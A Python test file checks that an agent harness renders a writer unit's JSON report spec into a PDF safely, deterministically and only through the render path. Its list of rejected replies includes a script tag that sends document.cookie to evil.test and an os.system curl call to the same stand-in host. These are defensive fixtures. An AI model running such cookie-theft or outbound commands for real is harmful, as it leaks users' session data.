"""LW-10 (ADR-0029): a Writer's deliver unit for a PDF emits DeliverableSpec JSON; `render_pdf` runs in-process and the
bytes are stored with origin `render`. No model call is added (a scripted fake model), no paid call, no network.

Not done here: the `app` half (AppSpec and `app.spec`) waits for the contracts in PR #684.
"""

from __future__ import annotations

import asyncio
import json
import subprocess
import sys
from pathlib import Path
from typing import Any

import pytest
from agt_output_support import ORG, RUN, SECRET, WORLD, make_rig, outcome, run_units, unit_output
from tilo_harness.executor import UnitContext
from tilo_harness.outputs import OutputRefused, keep
from tilo_harness.tool_runner import ToolUnitRunner
from tilo_providers.fake import FakeModelProvider
from tilo_providers.interfaces import GenerateRequest, GenerateResponse

REPO = Path(__file__).resolve().parents[3]
UNIT = {"id": "U1", "title": "Market report", "unit_type": "deliver", "role": "writer"}
PDF_BRIEF = {"goal": "A market report", "deliverables": [{"title": "Market report", "format": "pdf"}]}
SPEC = {
    "title": "Market report",
    "date": "2026-10-08",
    "tables": [{"id": "t1", "columns": ["Year", "Sales"], "rows": [["2025", 4], ["2026", 6]]}],
    "charts": [{"id": "c1", "kind": "bar", "table_id": "t1", "x": "Year", "y": "Sales", "title": "Sales"}],
    "sections": [
        {
            "heading": "Summary",
            "blocks": [{"type": "paragraph", "text": "Sales rose."}, {"type": "table", "table_id": "t1"}],
        },
        {"heading": "Chart", "blocks": [{"type": "chart", "chart_id": "c1"}]},
    ],
}
GOOD = json.dumps(SPEC)


class Script(FakeModelProvider):
    def __init__(self, reply: str) -> None:
        super().__init__("script")
        self.reply, self.requests = reply, []

    def generate(self, request: GenerateRequest) -> GenerateResponse:
        self.requests.append(request)
        return GenerateResponse(text=self.reply, profile_id="script")


def run_runner(reply: str, brief: Any = PDF_BRIEF, unit: dict[str, Any] = UNIT) -> tuple[Any, Script]:
    provider = Script(reply)
    runner = ToolUnitRunner({"writer": provider})
    outcome = asyncio.run(runner.run(unit, UnitContext("A_s0", (), brief=brief)))
    return outcome, provider


class AsDeliver:
    """Runs the shared runner as a writer's `deliver` unit (the harness test plans build specialist units)."""

    def __init__(self, reply: str, brief: Any = PDF_BRIEF) -> None:
        self.inner, self.brief = ToolUnitRunner({"writer": Script(reply)}), brief

    async def run(self, unit: dict[str, Any], context: UnitContext) -> Any:
        unit = unit | {"role": "writer", "unit_type": "deliver"}
        return await self.inner.run(unit, UnitContext(context.agent_id, (), brief=self.brief))


def test_LW_10_a_valid_spec_reply_becomes_one_rendered_pdf_output() -> None:
    outcome, provider = run_runner(GOOD)
    assert outcome.success and len(outcome.outputs) == 1
    out = outcome.outputs[0]
    assert out.media_type == "application/pdf" and out.content.startswith(b"%PDF-")
    assert "DeliverableSpec" in provider.requests[0].prompt and "Market report" in provider.requests[0].prompt


def test_LW_10_a_unit_that_is_not_a_pdf_deliver_unit_keeps_its_text_prompt_and_output() -> None:
    md = {"goal": "g", "deliverables": [{"title": "Notes", "format": "markdown"}]}
    outcome, provider = run_runner("# Notes", brief=md)
    assert outcome.outputs[0].media_type == "text/markdown" and "DeliverableSpec" not in provider.requests[0].prompt
    other = UNIT | {"unit_type": "research", "role": "writer"}
    outcome, provider = run_runner("# Notes", unit=other)
    assert outcome.outputs[0].content == b"# Notes" and "DeliverableSpec" not in provider.requests[0].prompt


def test_LW_10_the_stored_artifact_has_origin_render_pdf_bytes_and_an_AR_05_key(tmp_path: Path) -> None:
    ran = run_units(tmp_path, {"U1": None}, runner=AsDeliver(GOOD), with_archive=True)
    assert ran.result.outcomes["U1"].success
    created = ran.of("artifact.created")
    assert len(created) == 1
    ref = created[0]["data"]["artifact"]
    version = ran.rig.store.head(ran.rig.scope, ref)
    record = version.record
    assert record["media_type"] == "application/pdf"
    assert record["origin"] == {"kind": "render", "unit": "U1", "agent": None}
    assert record["idempotency_key"] == f"{RUN}:U1:0:0"
    assert ran.rig.store.read(ran.rig.scope, ref).startswith(b"%PDF-")
    assert ran.rig.store.manifest_revisions(ran.rig.scope, ref)  # the created manifest, as for any unit output


def test_LW_10_the_same_spec_gives_the_same_bytes_and_a_restart_gets_the_same_version(tmp_path: Path) -> None:
    first, second = run_run(tmp_path / "a"), run_run(tmp_path / "b")
    assert first == second  # determinism: the bytes (and so the hash) do not depend on the run
    rig = make_rig()
    pdf = run_runner(GOOD)[0].outputs[0]
    common: dict[str, Any] = {
        "artifacts": rig.store, "scope": rig.scope, "archive": None, "redact": rig.redactor, "run_id": RUN,
        "unit": UNIT, "worker": "A_s0", "events": [], "max_attempts": 3, "recorded": lambda _id: 0,
    }  # fmt: skip
    a, b = keep([pdf], **common), keep([run_runner(GOOD)[0].outputs[0]], **common)
    assert a[0].version.ref == b[0].version.ref and a[0].version.record["idempotency_key"] == f"{RUN}:U1:0:0"


def run_run(tmp_path: Path) -> bytes:
    tmp_path.mkdir()
    ran = run_units(tmp_path, {"U1": None}, runner=AsDeliver(GOOD))
    ref = ran.of("artifact.created")[0]["data"]["artifact"]
    return bytes(ran.rig.store.read(ran.rig.scope, ref))


BAD = {
    "prose": "Here is your report: it was a good year.",
    "fenced": "```json\n" + GOOD + "\n```",
    "trailing text": GOOD + "\nHope this helps!",
    "leading text": "Sure! " + GOOD,
    "not an object": "[1, 2, 3]",
    "script": "<script>fetch('https://evil.test/' + document.cookie)</script>",
    "python": "import os\nos.system('curl https://evil.test')",
    "unknown field": json.dumps(SPEC | {"script": "alert(1)"}),
    "missing date": json.dumps({k: v for k, v in SPEC.items() if k != "date"}),
    "bad chart link": json.dumps(SPEC | {"charts": [dict(SPEC["charts"][0], table_id="nope")]}),
    "nan": GOOD.replace('"Sales rose."', '"x"').replace('["2026", 6]', '["2026", NaN]'),
    "duplicate keys": '{"title": "a", "title": "b", "date": "2026-10-08"}',
    "deep nesting": '{"a":' * 50_000 + "1" + "}" * 50_000,
    "oversize": json.dumps(SPEC | {"subtitle": "x" * 3_000_000}),
    "blank": "   ",
}


@pytest.mark.parametrize("reply", list(BAD.values()), ids=list(BAD))
def test_LW_10_a_reply_that_is_not_one_valid_spec_fails_the_unit_and_stores_nothing(reply: str, tmp_path: Path) -> None:
    outcome, provider = run_runner(reply)
    assert not outcome.success and outcome.outputs == () and len(provider.requests) == 1
    assert "evil.test" not in outcome.summary and "Sales" not in outcome.summary  # a plain, fixed reason
    ran = run_units(tmp_path, {"U1": None}, runner=AsDeliver(reply), with_archive=True)
    assert not ran.result.outcomes["U1"].success
    assert ran.of("artifact.created") == [] and ran.rig.meta.paths() == [] and ran.rig.blobs._blobs == {}


def test_LW_10_script_like_text_inside_a_valid_spec_is_printed_never_run() -> None:
    spec = SPEC | {"title": "<script>alert(1)</script>", "subtitle": "<img src=http://evil.test/x.png>"}
    outcome, _ = run_runner(json.dumps(spec))
    pdf = outcome.outputs[0].content
    assert pdf.startswith(b"%PDF-") and b"/JavaScript" not in pdf and b"/JS" not in pdf and b"/URI" not in pdf
    assert b"/OpenAction" not in pdf and b"/Launch" not in pdf


def test_LW_10_a_pdf_is_stored_only_through_the_render_path() -> None:
    rig = make_rig()
    common: dict[str, Any] = {
        "artifacts": rig.store, "scope": rig.scope, "archive": None, "redact": rig.redactor, "run_id": RUN,
        "unit": UNIT, "worker": "A_s0", "events": [], "max_attempts": 3, "recorded": lambda _id: 0,
    }  # fmt: skip
    pdf = run_runner(GOOD)[0].outputs[0].content
    with pytest.raises(OutputRefused):
        keep([unit_output(pdf, "application/pdf")], **common)  # an ordinary unit output is text or JSON only
    with pytest.raises(OutputRefused):
        keep([unit_output(b"%PDF-1.4 hand made", "application/pdf")], **common)
    from tilo_harness.outputs import RenderedPdf

    with pytest.raises(ValueError):
        RenderedPdf(media_type="text/markdown", content=b"# not a pdf")
    with pytest.raises(ValueError):
        RenderedPdf(media_type="application/pdf", content=b"not a pdf")
    with pytest.raises(ValueError):
        RenderedPdf(media_type="application/pdf", content=b"%PDF-1.4" + b"0" * (20 * 1024 * 1024))
    assert rig.meta.paths() == [] and rig.blobs._blobs == {}


def test_LW_10_a_report_that_holds_a_secret_is_refused_not_stored() -> None:
    rig = make_rig()
    leaky = json.dumps(SPEC | {"subtitle": "key " + SECRET})
    pdf = run_runner(leaky)[0].outputs[0]
    common: dict[str, Any] = {
        "artifacts": rig.store, "scope": rig.scope, "archive": None, "redact": rig.redactor, "run_id": RUN,
        "unit": UNIT, "worker": "A_s0", "events": [], "max_attempts": 3, "recorded": lambda _id: 0,
    }  # fmt: skip
    with pytest.raises(OutputRefused):
        keep([pdf], **common)
    assert rig.meta.paths() == [] and rig.blobs._blobs == {}


def test_LW_10_text_outputs_of_other_units_are_stored_as_before(tmp_path: Path) -> None:
    ran = run_units(tmp_path, {"U1": outcome([unit_output()])})
    ref = ran.of("artifact.created")[0]["data"]["artifact"]
    record = ran.rig.store.head(ran.rig.scope, ref).record
    assert record["media_type"] == "text/markdown"
    assert record["origin"]["kind"] == "unit" and record["origin"]["agent"] == ran.workers["U1"]
    assert (ORG, WORLD) == (record["org_id"], record["world_id"])


def test_LW_10_the_harness_imports_tilo_render_without_a_cycle() -> None:
    for first, second in (
        ("tilo_harness.deliverable", "tilo_render.pdf"),
        ("tilo_render.pdf", "tilo_harness.deliverable"),
    ):
        code = f"import {first}, {second}; import tilo_harness.tool_runner"
        done = subprocess.run([sys.executable, "-I", "-c", code], capture_output=True, text=True, check=False)
        assert done.returncode == 0, done.stderr
    for source in (REPO / "services" / "render" / "src").rglob("*.py"):
        assert "tilo_harness" not in source.read_text(encoding="utf-8")


def test_LW_10_the_harness_image_carries_what_render_pdf_reads() -> None:
    docker = (REPO / "services" / "harness" / "Dockerfile").read_text(encoding="utf-8")
    ignore = (REPO / ".dockerignore").read_text(encoding="utf-8").splitlines()
    assert "COPY design/tokens.json" in docker and "!design/tokens.json" in ignore
    assert "tilo-render" in (REPO / "services" / "harness" / "pyproject.toml").read_text(encoding="utf-8")
